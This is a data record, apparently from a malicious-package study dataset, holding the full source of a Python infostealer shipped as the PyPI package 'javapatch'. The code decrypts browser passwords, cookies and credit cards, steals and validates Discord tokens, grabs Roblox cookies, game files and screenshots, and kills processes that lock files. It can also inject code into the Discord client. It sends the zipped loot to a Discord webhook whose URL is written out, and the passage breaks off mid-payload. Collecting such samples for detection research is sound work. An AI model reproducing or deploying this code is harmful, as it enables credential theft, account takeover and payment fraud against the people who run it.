[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/javapatch-0.7/javapatch-0.7/src/javapatch/__init__.py",
    "malicious_code": "import os,json,shutil,base64,sqlite3,zipfile,requests,subprocess,psutil,random,ctypes,sys,re,datetime,time,traceback\nimport ctypes.wintypes as wintypes\nfrom threading import Thread\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\nfrom Crypto.Cipher import AES\n\nconfig = {\n    'webhook': 'https://discord.com/api/webhooks/1154967436722962493/-styemuSIUtr6xXRP4Kl6wuOawIi1theLKqbRWTSZJ_od8oshGqFg8i0bAiaH7rGaapS',\n    'persist': False,\n    'keep-alive': False,\n    'injection_url': 'url to injection (raw)',\n    'inject': False,\n    'hideconsole': False,\n    'antivm': True,\n    'force_admin': False,\n    'black_screen': False,\n    'error': False,\n    'error_message': 'This application failed to start because MSCVDLL.dll is missing.\\n\\nPlease download the latest version of Microsoft C++ Compiler and try again.',\n}\n\nclass functions(object):\n    def getHeaders(self, token:str=None, content_type=\"application/json\") -> dict:\n        headers = {\"Content-Type\": content_type, \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\"}\n        if token: headers.update({\"Authorization\": token})\n        return headers\n    def get_master_key(self, path) -> str:\n        try:\n            with open(path, \"r\", encoding=\"utf-8\") as f: local_state = f.read()\n            local_state = json.loads(local_state)\n            master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n            master_key = master_key[5:]\n            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n            return master_key\n        except Exception:\n            return None\n    def decrypt_val(self, buff, master_key) -> str:\n        try:\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = AES.new(master_key, AES.MODE_GCM, iv)\n            decrypted_pass = cipher.decrypt(payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n        except Exception: return f'Failed to decrypt \"{str(buff)}\" | Key: \"{str(master_key)}\"'\n    def whichProcessesUsingFile(self, path: str) -> list:\n            ntdll = ctypes.WinDLL('ntdll')\n            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)\n            NTSTATUS = wintypes.LONG\n            INVALID_HANDLE_VALUE = wintypes.HANDLE(-1).value\n            FILE_READ_ATTRIBUTES = 0x80\n            FILE_SHARE_READ = 1\n            OPEN_EXISTING = 3\n            FILE_FLAG_BACKUP_SEMANTICS = 0x02000000\n            FILE_INFORMATION_CLASS = wintypes.ULONG\n            FileProcessIdsUsingFileInformation = 47\n            LPSECURITY_ATTRIBUTES = wintypes.LPVOID\n            ULONG_PTR = wintypes.WPARAM\n            kernel32.CreateFileW.restype = wintypes.HANDLE\n            kernel32.CreateFileW.argtypes = (\n                wintypes.LPCWSTR,      # In     lpFileName\n                wintypes.DWORD,        # In     dwDesiredAccess\n                wintypes.DWORD,        # In     dwShareMode\n                LPSECURITY_ATTRIBUTES,  # In_opt lpSecurityAttributes\n                wintypes.DWORD,        # In     dwCreationDisposition\n                wintypes.DWORD,        # In     dwFlagsAndAttributes\n                wintypes.HANDLE)       # In_opt hTemplateFile\n            hFile = kernel32.CreateFileW(\n                path, FILE_READ_ATTRIBUTES, FILE_SHARE_READ, None, OPEN_EXISTING,\n                FILE_FLAG_BACKUP_SEMANTICS, None)\n            if hFile == INVALID_HANDLE_VALUE:\n                raise ctypes.WinError(ctypes.get_last_error())\n            class IO_STATUS_BLOCK(ctypes.Structure):\n                class _STATUS(ctypes.Union):\n                    _fields_ = (('Status', NTSTATUS),\n                                ('Pointer', wintypes.LPVOID))\n                _anonymous_ = '_Status',\n                _fields_ = (('_Status', _STATUS),\n                            ('Information', ULONG_PTR))\n            iosb = IO_STATUS_BLOCK()\n            class FILE_PROCESS_IDS_USING_FILE_INFORMATION(ctypes.Structure):\n                _fields_ = (('NumberOfProcessIdsInList', wintypes.LARGE_INTEGER),\n                            ('ProcessIdList', wintypes.LARGE_INTEGER * 64))\n            info = FILE_PROCESS_IDS_USING_FILE_INFORMATION()\n            PIO_STATUS_BLOCK = ctypes.POINTER(IO_STATUS_BLOCK)\n            ntdll.NtQueryInformationFile.restype = NTSTATUS\n            ntdll.NtQueryInformationFile.argtypes = (\n                wintypes.HANDLE,        # In  FileHandle\n                PIO_STATUS_BLOCK,       # Out IoStatusBlock\n                wintypes.LPVOID,        # Out FileInformation\n                wintypes.ULONG,         # In  Length\n                FILE_INFORMATION_CLASS)  # In  FileInformationClass\n            status = ntdll.NtQueryInformationFile(hFile, ctypes.byref(iosb),\n                                                ctypes.byref(info),\n                                                ctypes.sizeof(info),\n                                                FileProcessIdsUsingFileInformation)\n            pidList = info.ProcessIdList[0:info.NumberOfProcessIdsInList]\n            return pidList\n    def system(self, action):\n        return '\\n'.join(line for line in subprocess.check_output(action, creationflags=0x08000000, shell=True).decode().strip().splitlines() if line.strip())\n\nclass internal:\n    tempfolder = None\n    stolen = False\n\nclass ticks(functions, internal):\n    def __init__(self,useless):\n        del useless\n        if config.get('error'): Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, config.get('error_message'), os.path.basename(sys.argv[0]), 0x1 | 0x10)).start()\n        try: admin = ctypes.windll.shell32.IsUserAnAdmin()\n        except Exception: admin = False\n        if not admin and config['force_admin'] and '--nouacbypass' not in sys.argv: self.forceadmin()\n        self.webhook = config.get('webhook')\n        self.exceptions = []\n        self.baseurl = \"https://discord.com/api/v9/users/@me\"\n        self.appdata = os.getenv(\"localappdata\")\n        self.roaming = os.getenv(\"appdata\")\n        dirs = [\n            self.appdata,\n            self.roaming,\n            os.getenv('temp'),\n            'C:\\\\Users\\\\Public\\\\Public Music',\n            'C:\\\\Users\\\\Public\\\\Public Pictures',\n            'C:\\\\Users\\\\Public\\\\Public Videos',\n            'C:\\\\Users\\\\Public\\\\Public Documents',\n            'C:\\\\Users\\\\Public\\\\Public Downloads',\n            os.getenv('userprofile'),\n            os.getenv('userprofile') + '\\\\Documents',\n            os.getenv('userprofile') + '\\\\Music',\n            os.getenv('userprofile') + '\\\\Pictures',\n            os.getenv('userprofile') + '\\\\Videos'\n        ]\n        while True:\n            rootpath = random.choice(dirs)\n            if os.path.exists(rootpath):\n                self.tempfolder = os.path.join(rootpath,''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890',k=8)))\n                break\n        internal.tempfolder = self.tempfolder\n        self.browserpaths = {\n            'Opera': self.roaming + r'\\\\Opera Software\\\\Opera Stable',\n            'Opera GX': self.roaming + r'\\\\Opera Software\\\\Opera GX Stable',\n            'Edge': self.appdata + r'\\\\Microsoft\\\\Edge\\\\User Data',\n            'Chrome': self.appdata + r'\\\\Google\\\\Chrome\\\\User Data',\n            'Yandex': self.appdata + r'\\\\Yandex\\\\YandexBrowser\\\\User Data',\n            'Brave': self.appdata + r'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data',\n            'Amigo': self.appdata + r'\\\\Amigo\\\\User Data',\n            'Torch': self.appdata + r'\\\\Torch\\\\User Data',\n            'Kometa': self.appdata + r'\\\\Kometa\\\\User Data',\n            'Orbitum': self.appdata + r'\\\\Orbitum\\\\User Data',\n            'CentBrowser': self.appdata + r'\\\\CentBrowser\\\\User Data',\n            '7Star': self.appdata + r'\\\\7Star\\\\7Star\\\\User Data',\n            'Sputnik': self.appdata + r'\\\\Sputnik\\\\Sputnik\\\\User Data',\n            'Chrome SxS': self.appdata + r'\\\\Google\\\\Chrome SxS\\\\User Data',\n            'Epic Privacy Browser': self.appdata + r'\\\\Epic Privacy Browser\\\\User Data',\n            'Vivaldi': self.appdata + r'\\\\Vivaldi\\\\User Data',\n            'Chrome Beta': self.appdata + r'\\\\Google\\\\Chrome Beta\\\\User Data',\n            'Uran': self.appdata + r'\\\\uCozMedia\\\\Uran\\\\User Data',\n            'Iridium': self.appdata + r'\\\\Iridium\\\\User Data',\n            'Chromium': self.appdata + r'\\\\Chromium\\\\User Data'\n        }\n        self.stats = {\n            'passwords': 0,\n            'tokens': 0,\n            'phones': 0,\n            'addresses': 0,\n            'cards': 0,\n            'cookies': 0\n        }\n        try:\n            os.makedirs(os.path.join(self.tempfolder), 0x1ED, exist_ok=True)\n            ctypes.windll.kernel32.SetFileAttributesW(self.tempfolder,0x2)\n            ctypes.windll.kernel32.SetFileAttributesW(self.tempfolder,0x4)\n            ctypes.windll.kernel32.SetFileAttributesW(self.tempfolder,0x256)\n        except Exception: self.exceptions.append(traceback.format_exc())\n        os.chdir(self.tempfolder)\n        if config.get('persist') and not self.stolen: Thread(target=self.persist).start()\n        if config.get('inject'): Thread(target=self.injector).start()\n        self.tokens = []\n        self.robloxcookies = []\n        self.files = \"\"\n        threads = [Thread(target=self.screenshot),Thread(target=self.grabMinecraftCache),Thread(target=self.grabGDSave),Thread(target=self.tokenRun),Thread(target=self.grabRobloxCookie),Thread(target=self.getSysInfo)]\n        for plt, pth in self.browserpaths.items(): threads.append(Thread(target=self.grabBrowserInfo,args=(plt,pth)))\n        for thread in threads: thread.start()\n        for thread in threads: thread.join()\n        if self.exceptions:\n            with open(self.tempfolder+'\\\\Exceptions.txt','w',encoding='utf-8') as f:\n                f.write('\\n'.join(self.exceptions))\n        self.SendInfo()\n        shutil.rmtree(self.tempfolder)\n        if config.get('black_screen'): self.system('start ms-cxh-full://0')\n    def tokenRun(self):\n        self.grabTokens()\n        self.neatifyTokens()\n    def checkToken(self, tkn, source):\n        try:\n            r = requests.get(self.baseurl, headers=self.getHeaders(tkn))\n            if r.status_code == 200 and tkn not in [token[0] for token in self.tokens]:\n                self.tokens.append((tkn, source))\n                self.stats['tokens'] += 1\n        except Exception: self.exceptions.append(traceback.format_exc())\n    def bypassBetterDiscord(self):\n        bd = self.roaming+\"\\\\BetterDiscord\\\\data\\\\betterdiscord.asar\"\n        if os.path.exists(bd):\n            with open(bd, 'r', encoding=\"utf8\", errors='ignore') as f:\n                txt = f.read()\n                content = txt.replace('api/webhooks', 'api/nethooks')\n            with open(bd, 'w', newline='', encoding=\"utf8\", errors='ignore') as f: f.write(content)\n    def grabBrowserInfo(self, platform, path):\n        if os.path.exists(path):\n            self.passwords_temp = self.cookies_temp = self.history_temp = self.misc_temp = self.formatted_cookies = ''\n            sep = '='*40\n            fname = lambda x: f'\\\\{platform} Info ({x}).txt'\n            formatter = lambda p, c, h, m: f'Browser: {platform}\\n\\n{sep}\\n               PASSWORDS\\n{sep}\\n\\n{p}\\n{sep}\\n                COOKIES\\n{sep}\\n\\n{c}\\n{sep}\\n                HISTORY\\n{sep}\\n\\n{h}\\n{sep}\\n               OTHER INFO\\n{sep}\\n\\n{m}'\n            profiles = ['Default']\n            for dir in os.listdir(path):\n                if dir.startswith('Profile ') and os.path.isdir(dir): profiles.append(dir)\n            if platform in [\n                'Opera',\n                'Opera GX',\n                'Amigo',\n                'Torch',\n                'Kometa',\n                'Orbitum',\n                'CentBrowser',\n                '7Star',\n                'Sputnik',\n                'Chrome SxS',\n                'Epic Privacy Browser',\n            ]:\n                cpath = path + '\\\\Network\\\\Cookies'\n                ppath = path + '\\\\Login Data'\n                hpath = path + '\\\\History'\n                wpath = path + '\\\\Web Data'\n                mkpath = path + '\\\\Local State'\n                fname = f'\\\\{platform} Info (Default).txt'\n                threads = [\n                    Thread(target=self.grabPasswords,args=[mkpath,platform,'Default',ppath]),\n                    Thread(target=self.grabCookies,args=[mkpath,platform,'Default',cpath]),\n                    Thread(target=self.grabHistory,args=[mkpath,platform,'Default',hpath]),\n                    Thread(target=self.grabMisc,args=[mkpath,platform,'Default',wpath])\n                ]\n                for x in threads:\n                    x.start()\n                for x in threads:\n                    x.join()\n                try: self.grabPasswords(mkpath,fname,ppath); self.grabCookies(mkpath,fname,cpath); self.grabHistory(mkpath,fname,hpath); self.grabMisc(mkpath,fname,wpath)\n                except Exception: self.exceptions.append(traceback.format_exc())\n            else:\n                for profile in profiles:\n                    cpath = path + f'\\\\{profile}\\\\Network\\\\Cookies'\n                    ppath = path + f'\\\\{profile}\\\\Login Data'\n                    hpath = path + f'\\\\{profile}\\\\History'\n                    wpath = path + f'\\\\{profile}\\\\Web Data'\n                    mkpath = path + '\\\\Local State'\n                    fname = f'\\\\{platform} Info ({profile}).txt'\n                    threads = [\n                        Thread(target=self.grabPasswords,args=[mkpath,platform,profile,ppath]),\n                        Thread(target=self.grabCookies,args=[mkpath,platform,profile,cpath]),\n                        Thread(target=self.grabHistory,args=[mkpath,platform,profile,hpath]),\n                        Thread(target=self.grabMisc,args=[mkpath,platform,profile,wpath])\n                    ]\n                    for x in threads:\n                        x.start()\n                    for x in threads:\n                        x.join()\n            with open(self.tempfolder+f'\\\\{platform} Cookies ({profile}).txt', \"w\", encoding=\"utf8\", errors='ignore') as m, open(self.tempfolder+fname, \"w\", encoding=\"utf8\", errors='ignore') as f:\n                if self.formatted_cookies:\n                    m.write(self.formatted_cookies)\n                else:\n                    m.close()\n                    os.remove(self.tempfolder+f'\\\\{platform} Cookies ({profile}).txt')\n                if self.passwords_temp or self.cookies_temp or self.history_temp or self.misc_temp:\n                    f.write(formatter(self.passwords_temp, self.cookies_temp, self.history_temp, self.misc_temp))\n                else:\n                    f.close()\n                    os.remove(self.tempfolder+fname)\n            self.passwords_temp = self.cookies_temp = self.history_temp = self.misc_temp = self.formatted_cookies = ''\n    def injector(self):\n        self.bypassBetterDiscord()\n        for dir in os.listdir(self.appdata):\n            if 'discord' in dir.lower():\n                discord = self.appdata+f'\\\\{dir}'\n                disc_sep = discord+'\\\\'\n                for _dir in os.listdir(os.path.abspath(discord)):\n                    if re.match(r'app-(\\d*\\.\\d*)*', _dir):\n                        app = os.path.abspath(disc_sep+_dir)\n                        for x in os.listdir(os.path.join(app,'modules')):\n                            if x.startswith('discord_desktop_core-'):\n                                inj_path = app+f'\\\\modules\\\\{x}\\\\discord_desktop_core\\\\'\n                                if os.path.exists(inj_path):\n                                    f = requests.get(config.get('injection_url')).text.replace(\"%WEBHOOK%\", self.webhook)\n                                    with open(inj_path+'index.js', 'w', errors=\"ignore\") as indexFile: indexFile.write(f)\n    def grabPasswords(self,mkp,bname,pname,data):\n        self.passwords_temp = ''\n        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_PASSWORDS.db'.replace(' ','_'))\n        master_key = self.get_master_key(mkp)\n        login_db = data\n        try: shutil.copy2(login_db, newdb)\n        except PermissionError:\n            try:\n                for pid in self.whichProcessesUsingFile(login_db):\n                    self.system(f\"taskkill /f /pid {pid}\")\n                shutil.copy2(login_db, newdb)\n            except Exception:\n                pass\n        except Exception: self.exceptions.append(traceback.format_exc())\n        conn = sqlite3.connect(newdb)\n        cursor = conn.cursor()\n        try:\n            cursor.execute(\"SELECT action_url, username_value, password_value FROM logins\")\n            for r in cursor.fetchall():\n                url = r[0]\n                username = r[1]\n                encrypted_password = r[2]\n                decrypted_password = self.decrypt_val(encrypted_password, master_key)\n                if url != \"\":\n                    self.passwords_temp += f\"\\nDomain: {url}\\nUser: {username}\\nPass: {decrypted_password}\\n\"\n                    self.stats['passwords'] += 1\n        except Exception: self.exceptions.append(traceback.format_exc())\n        cursor.close()\n        conn.close()\n        try: os.remove(newdb)\n        except Exception: self.exceptions.append(traceback.format_exc())\n    def grabCookies(self,mkp,bname,pname,data):\n        self.cookies_temp = ''\n        self.formatted_cookies = ''\n        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_COOKIES.db'.replace(' ','_'))\n        master_key = self.get_master_key(mkp)\n        login_db = data\n        try: shutil.copy2(login_db, newdb)\n        except PermissionError:\n            try:\n                for pid in self.whichProcessesUsingFile(login_db):\n                    self.system(f\"taskkill /f /pid {pid}\")\n                shutil.copy2(login_db, newdb)\n            except Exception:\n                pass\n        except Exception: self.exceptions.append(traceback.format_exc())\n        conn = sqlite3.connect(newdb)\n        cursor = conn.cursor()\n        try:\n            cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")\n            for r in cursor.fetchall():\n                host = r[0]\n                user = r[1]\n                decrypted_cookie = self.decrypt_val(r[2], master_key)\n                if host != \"\":\n                    self.cookies_temp += f\"\\nHost: {host}\\nUser: {user}\\nCookie: {decrypted_cookie}\\n\"\n                    self.formatted_cookies += f\"{host}\\tTRUE\\t/\\tFALSE\\t1708726694\\t{user}\\t{decrypted_cookie}\\n\"\n                    self.stats['cookies'] += 1\n                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie: self.robloxcookies.append(decrypted_cookie)\n        except Exception: self.exceptions.append(traceback.format_exc())\n        cursor.close()\n        conn.close()\n        try: os.remove(newdb)\n        except Exception: self.exceptions.append(traceback.format_exc())\n    def grabHistory(self,mkp,bname,pname,data):\n        self.history_temp = ''\n        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_HISTORY.db'.replace(' ','_'))\n        login_db = data\n        try: shutil.copy2(login_db, newdb)\n        except PermissionError:\n            try:\n                for pid in self.whichProcessesUsingFile(login_db):\n                    self.system(f\"taskkill /f /pid {pid}\")\n                shutil.copy2(login_db, newdb)\n            except Exception:\n                pass\n        except Exception: self.exceptions.append(traceback.format_exc())\n        conn = sqlite3.connect(newdb)\n        cursor = conn.cursor()\n        try:\n            cursor.execute(\"SELECT title, url, visit_count, last_visit_time FROM urls\")\n            for r in cursor.fetchall()[::-1]:\n                title = r[0]\n                url = r[1]\n                count = r[2]\n                time = r[3]\n                time_neat = str(datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=time))[:-7].replace('-','/')\n                if url != \"\":\n                    self.history_temp += f\"\\nURL: {title}\\nTitle: {url}\\nVisit Count: {count}\\nLast Visited: {time_neat}\\n\"\n        except Exception: self.exceptions.append(traceback.format_exc())\n        cursor.close()\n        conn.close()\n        try: os.remove(newdb)\n        except Exception: self.exceptions.append(traceback.format_exc())\n    def grabMisc(self,mkp,bname,pname,data):\n        self.misc_temp = ''\n        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_WEBDATA.db'.replace(' ','_'))\n        master_key = self.get_master_key(mkp)\n        login_db = data\n        try: shutil.copy2(login_db, newdb)\n        except PermissionError:\n            try:\n                for pid in self.whichProcessesUsingFile(login_db):\n                    self.system(f\"taskkill /f /pid {pid}\")\n                shutil.copy2(login_db, newdb)\n            except Exception:\n                pass\n        except Exception: self.exceptions.append(traceback.format_exc())\n        conn = sqlite3.connect(newdb)\n        cursor = conn.cursor()\n        try:\n            cursor.execute(\"SELECT street_address, city, state, zipcode FROM autofill_profiles\")\n            for r in cursor.fetchall():\n                Address = r[0]\n                City = r[1]\n                State = r[2]\n                ZIP = r[3]\n                if Address != \"\":\n                    self.misc_temp += f\"\\nAddress: {Address}\\nCity: {City}\\nState: {State}\\nZIP Code: {ZIP}\\n\"\n                    self.stats['addresses'] += 1\n            cursor.execute(\"SELECT number FROM autofill_profile_phones\")\n            for r in cursor.fetchall():\n                Number = r[0]\n                if Number != \"\":\n                    self.misc_temp += f\"\\nPhone Number: {Number}\\n\"\n                    self.stats['phones'] += 1\n            cursor.execute(\"SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards\")\n            for r in cursor.fetchall():\n                Name = r[0]\n                ExpM = r[1]\n                ExpY = r[2]\n                decrypted_card = self.decrypt_val(r[3], master_key)\n                if decrypted_card != \"\":\n                    self.misc_temp += f\"\\nCard Number: {decrypted_card}\\nName on Card: {Name}\\nExpiration Month: {ExpM}\\nExpiration Year: {ExpY}\\n\"\n                    self.stats['cards'] += 1\n        except Exception: self.exceptions.append(traceback.format_exc())\n        cursor.close()\n        conn.close()\n        try: os.remove(newdb)\n        except Exception: self.exceptions.append(traceback.format_exc())\n    def grabRobloxCookie(self):\n        try: self.robloxcookies.append(self.system(r\"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com' -Name .ROBLOSECURITY\"))\n        except Exception: pass\n        if self.robloxcookies:\n            with open(self.tempfolder+\"\\\\Roblox Cookies.txt\", \"w\") as f:\n                for i in self.robloxcookies: f.write(i+'\\n')\n    def grabTokens(self):\n        paths = {\n            'Discord': self.roaming + r'\\\\discord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord Canary': self.roaming + r'\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\',\n            'Lightcord': self.roaming + r'\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord PTB': self.roaming + r'\\\\discordptb\\\\Local Storage\\\\leveldb\\\\',\n            'Opera': self.roaming + r'\\\\Opera Software\\\\Opera Stable',\n            'Opera GX': self.roaming + r'\\\\Opera Software\\\\Opera GX Stable',\n            'Amigo': self.appdata + r'\\\\Amigo\\\\User Data',\n            'Torch': self.appdata + r'\\\\Torch\\\\User Data',\n            'Kometa': self.appdata + r'\\\\Kometa\\\\User Data',\n            'Orbitum': self.appdata + r'\\\\Orbitum\\\\User Data',\n            'CentBrowser': self.appdata + r'\\\\CentBrowser\\\\User Data',\n            '7Star': self.appdata + r'\\\\7Star\\\\7Star\\\\User Data',\n            'Sputnik': self.appdata + r'\\\\Sputnik\\\\Sputnik\\\\User Data',\n            'Chrome SxS': self.appdata + r'\\\\Google\\\\Chrome SxS\\\\User Data',\n            'Epic Privacy Browser': self.appdata + r'\\\\Epic Privacy Browser\\\\User Data',\n            'Vivaldi': self.appdata + r'\\\\Vivaldi\\\\User Data\\\\<PROFILE>',\n            'Chrome': self.appdata + r'\\\\Google\\\\Chrome\\\\User Data\\\\<PROFILE>',\n            'Chrome Beta': self.appdata + r'\\\\Google\\\\Chrome Beta\\\\User Data\\\\<PROFILE>',\n            'Edge': self.appdata + r'\\\\Microsoft\\\\Edge\\\\User Data\\\\<PROFILE>',\n            'Uran': self.appdata + r'\\\\uCozMedia\\\\Uran\\\\User Data\\\\<PROFILE>',\n            'Yandex': self.appdata + r'\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\<PROFILE>',\n            'Brave': self.appdata + r'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\<PROFILE>',\n            'Iridium': self.appdata + r'\\\\Iridium\\\\User Data\\\\<PROFILE>',\n            'Chromium': self.appdata + r'\\\\Chromium\\\\User Data\\\\<PROFILE>'\n        }\n        for source, path in paths.items():\n            if not os.path.exists(path.replace('<PROFILE>','')): continue\n            if \"discord\" not in path:\n                profiles = ['Default']\n                for dir in os.listdir(path.replace('<PROFILE>','')):\n                    if dir.startswith('Profile '):\n                        profiles.append(dir)\n                for profile in profiles:\n                    newpath = path.replace('<PROFILE>',profile) + r'\\\\Local Storage\\\\leveldb\\\\'\n                    for file_name in os.listdir(newpath):\n                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue\n                        for line in [x.strip() for x in open(f'{newpath}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                            for token in re.findall(r\"[\\w-]{24,28}\\.[\\w-]{6}\\.[\\w-]{25,110}\", line): self.checkToken(token, f'{source} ({profile})')\n            else:\n                if os.path.exists(self.roaming+'\\\\discord\\\\Local State'):\n                    for file_name in os.listdir(path):\n                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue\n                        for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                            for y in re.findall(r\"dQw4w9WgXcQ:[^\\\"]*\", line): token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\\\discord\\\\Local State')); self.checkToken(token, source)\n        if os.path.exists(self.roaming+\"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n            for path, _, files in os.walk(self.roaming+\"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n                for _file in files:\n                    if not _file.endswith('.sqlite'): continue\n                    for line in [x.strip() for x in open(f'{path}\\\\{_file}', errors='ignore').readlines() if x.strip()]:\n                            for token in re.findall(r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}\", line): self.checkToken(token, 'Firefox')\n    def neatifyTokens(self):\n        f = open(self.tempfolder+\"\\\\Discord Info.txt\", \"w+\", encoding=\"utf8\", errors='ignore')\n        for info in self.tokens:\n            token = info[0]\n            j = requests.get(self.baseurl, headers=self.getHeaders(token)).json()\n            user = j.get('username') + '#' + str(j.get(\"discriminator\"))\n            badges = \"\"\n            flags = j['flags']\n            if (flags == 1): badges += \"Staff, \"\n            if (flags == 2): badges += \"Partner, \"\n            if (flags == 4): badges += \"Hypesquad Event, \"\n            if (flags == 8): badges += \"Green Bughunter, \"\n            if (flags == 64): badges += \"Hypesquad Bravery, \"\n            if (flags == 128): badges += \"HypeSquad Brillance, \"\n            if (flags == 256): badges += \"HypeSquad Balance, \"\n            if (flags == 512): badges += \"Early Supporter, \"\n            if (flags == 16384): badges += \"Gold BugHunter, \"\n            if (flags == 131072): badges += \"Verified Bot Developer, \"\n            if (badges == \"\"): badges = \"None\"\n            email = j.get(\"email\")\n            phone = j.get(\"phone\") if j.get(\"phone\") else \"No Phone Number attached\"\n            try: nitro_data = requests.get(self.baseurl+'/billing/subscriptions', headers=self.getHeaders(token)).json()\n            except Exception: self.exceptions.append(traceback.format_exc())\n            has_nitro = False\n            has_nitro = bool(len(nitro_data) > 0)\n            try: billing = bool(len(json.loads(requests.get(self.baseurl+\"/billing/payment-sources\", headers=self.getHeaders(token)).text)) > 0)\n            except Exception: self.exceptions.append(traceback.format_exc())\n            f.write(f\"{' '*17}{user}\\n{'-'*50}\\nToken: {token}\\nPlatform: {info[1]}\\nHas Billing: {billing}\\nNitro: {has_nitro}\\nBadges: {badges}\\nEmail: {email}\\nPhone: {phone}\\n\\n\")\n        f.seek(0)\n        content = f.read()\n        f.close()\n        if not content:\n            os.remove(self.tempfolder+\"\\\\Discord Info.txt\")\n    def screenshot(self):\n        image = ImageGrab.grab(\n            bbox=None, \n            include_layered_windows=False, \n            all_screens=True, \n            xdisplay=None\n        )\n        image.save(self.tempfolder + \"\\\\Screenshot.png\")\n        image.close()\n    def grabMinecraftCache(self):\n        if not os.path.exists(os.path.join(self.roaming, '.minecraft')): return\n        minecraft = os.path.join(self.tempfolder, 'Minecraft Cache')\n        os.makedirs(minecraft, exist_ok=True)\n        mc = os.path.join(self.roaming, '.minecraft')\n        to_grab = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']\n        for _file in to_grab:\n            if os.path.exists(os.path.join(mc, _file)):\n                shutil.copy2(os.path.join(mc, _file), minecraft + os.sep + _file)\n    def grabGDSave(self):\n        if not os.path.exists(os.path.join(self.appdata, 'GeometryDash')): return\n        gd = os.path.join(self.tempfolder, 'Geometry Dash Save')\n        os.makedirs(gd, exist_ok=True)\n        gdf = os.path.join(self.appdata, 'GeometryDash')\n        to_grab = ['CCGameManager.dat']\n        for _file in to_grab:\n            if os.path.exists(os.path.join(gdf, _file)):\n                shutil.copy2(os.path.join(gdf, _file), gd + os.sep + _file)\n    def SendInfo(self):\n        wname = self.getProductValues()[0]\n        wkey = self.getProductValues()[1]\n        ip = country = city = region = googlemap = \"None\"\n        try:\n            data = requests.get(\"https://ipinfo.io/json\").json()\n            ip = data['ip']\n            city = data['city']\n            country = data['country']\n            region = data['region']\n            googlemap = \"https://www.google.com/maps/search/google+map++\" + data['loc']\n        except Exception: self.exceptions.append(traceback.format_exc())\n        _zipfile = os.path.join(self.tempfolder, f'Fentanyl-{os.getlogin()}.zip')\n        zipped_file = zipfile.ZipFile(_zipfile, \"w\", zipfile.ZIP_DEFLATED)\n        abs_src = os.path.abspath(self.tempfolder)\n        for dirname, _, files in os.walk(self.tempfolder):\n            for filename in files:\n                if filename == f'Fentanyl-{os.getlogin()}.zip': continue\n                absname = os.path.abspath(os.path.join(dirname, filename))\n                arcname = absname[len(abs_src) + 1:]\n                zipped_file.write(absname, arcname)\n        zipped_file.close()\n        self.files, self.fileCount = self.gen_tree(self.tempfolder)\n        self.fileCount =  f\"{self.fileCount} File{'s' if self.fileCount != 1 else ''} Found: \"\n        embed = {\n            \"username\": f\"{os.getlogin()} | Fentanyl\",\n            \"content\": \"@everyone\",\n            \"avatar_url\":\"https://cdn.discordapp.com/attachments/976805447266877471/987826721250238464/c33cd7baf5e2abdf434c2793988ccb56.png\",\n            \"embeds\": [\n                {\n                    \"author\": {\n                        \"name\": \"Fentanyl strikes again!\",\n                        \"url\": \"https://youareanidiot.cc\",\n                        \"icon_url\": \"https://cdn.discordapp.com/attachments/976805447266877471/987826721250238464/c33cd7baf5e2abdf434c2793988ccb56.png\"\n                    },\n                    \"description\": f'**{os.getlogin()}** ran Fentanyl.\\n\\n**Computer Name:** {os.getenv(\"COMPUTERNAME\")}\\n**{wname}:** {wkey if wkey else \"No Product Key!\"}\\n**IP:** {ip} (VPN/Proxy: {requests.get(\"http://ip-api.com/json?fields=proxy\").json()[\"proxy\"]})\\n**City:** {city}\\n**Region:** {region}\\n**Country:** {country}\\n[Google Maps Location]({googlemap})\\n```ansi\\n\\u001b[32m{self.fileCount}\\u001b[35m{self.files}``````ansi\\n\\u001b[32mStats:\\n\\u001b[35mPasswords Found: {self.stats[\"passwords\"]}\\nCookies Found: {self.stats[\"cookies\"]}\\nPhone Numbers Found: {self.stats[\"phones\"]}\\nCards Found: {self.stats[\"cards\"]}\\nAddresses Found: {self.stats[\"addresses\"]}\\nTokens Found: {self.stats[\"tokens\"]}\\nTime: {\"{:.2f}\".format(time.time() - self.starttime)}s```',\n                    \"color\": 0x00FFFF,\n                    \"timestamp\": time.strftime(\"%Y-%m-%dT%H:%M:%S.000Z\", time.gmtime()),\n                    \"thumbnail\": {\n                      \"url\": 